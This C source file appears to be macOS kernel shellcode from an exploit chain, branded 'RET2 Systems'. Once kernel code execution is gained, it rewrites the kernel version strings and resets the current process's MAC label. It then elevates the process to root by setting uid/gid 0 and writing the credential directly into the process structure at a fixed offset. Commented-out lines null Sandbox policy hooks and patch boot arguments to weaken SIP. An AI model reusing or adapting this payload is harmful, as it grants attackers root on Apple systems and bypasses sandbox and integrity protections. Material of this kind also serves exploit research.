#include "kernel_sc_imports.h"

#define GLOB __attribute__((section("__TEXT, __text")))

// this will create "anonymous" global char[] from a string literal
// e.g. strcmp(a, CSTR("hello"));
#define CSTR(x) ({\
        static GLOB char tempstr[] = x;\
        tempstr;\
        })

void _start(struct kimports* kimp) {
    kimp->strcpy(kimp->osversion, CSTR("RET2 was here"));

    // get writable version of version
    char* version = (void*)(*kimp->physmap_base + kimp->kvtophys(kimp->version));
    kimp->strcpy(version, CSTR("Darwin Kernel Version 13.37: \x1b[91;1mproperty of RET2 Systems\x1b[0m"));

    /*
    // disable some sandbox policy hooks so the system-wide sandbox doesnt trigger for certain files
    for (unsigned int i = 0; i < kimp->mac_policy_list->staticmax; i++) {
        struct mac_policy_conf* mpc = kimp->mac_policy_list->entries[i].mpc;
        if (mpc && !kimp->strcmp(mpc->mpc_name, CSTR("Sandbox"))) {
            *(unsigned long*)(mpc->mpc_ops+0x858) = 0; // mpo_vnode_check_open
            *(unsigned long*)(mpc->mpc_ops+0x7f8) = 0; // mpo_vnode_check_create
            break;
        }
    }
    */
    // somewhat disable SIP
    //void* boot_args = *(void**)(kimp->PE_state+0xa0);
    //*(unsigned int*)(boot_args+0x498) = 0xffffffff; // allow all the things

    void* cred = kimp->kauth_cred_get_with_ref();
    kimp->mac_cred_label_destroy(cred);
    kimp->mac_cred_label_init(cred);
    // userspace will re-call setuid(0) to make sure some extra bookkeeping occurs
    cred = kimp->kauth_cred_setresuid(cred, 0, 0, 17, 0);
    cred = kimp->kauth_cred_setresgid(cred, 0, 0, 0);
    // manually overwrite p->u_cred
    *(void**)(kimp->current_proc()+0xf0) = cred;
    kimp->chgproccnt(0, 1);
}
